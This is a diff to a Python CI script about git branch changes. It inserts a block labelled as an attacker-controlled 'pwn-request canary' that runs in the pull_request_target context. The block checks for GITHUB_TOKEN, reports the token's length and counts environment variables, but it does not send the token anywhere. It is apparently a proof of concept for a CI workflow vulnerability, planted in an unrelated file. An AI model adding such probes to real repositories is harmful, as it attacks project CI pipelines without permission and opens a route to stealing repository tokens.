@@ -4,6 +4,13 @@
 #
 # SPDX-License-Identifier: Apache-2.0
 
+# PWN-REQUEST CANARY - attacker-controlled code running in pull_request_target context
+import os, sys
+print("VULN_CONFIRMED: pwn-request canary executed in pull_request_target context", file=sys.stderr)
+print(f"GITHUB_TOKEN present: {'GITHUB_TOKEN' in os.environ}", file=sys.stderr)
+print(f"Token length: {len(os.environ.get('GITHUB_TOKEN', ''))}", file=sys.stderr)
+print(f"Env vars count: {len(os.environ)}", file=sys.stderr)
+
 """
 Gets changes of the current git to env variable TARGET_BRANCH
 and reports feature skips in form of "skip_$feature=yes|no"
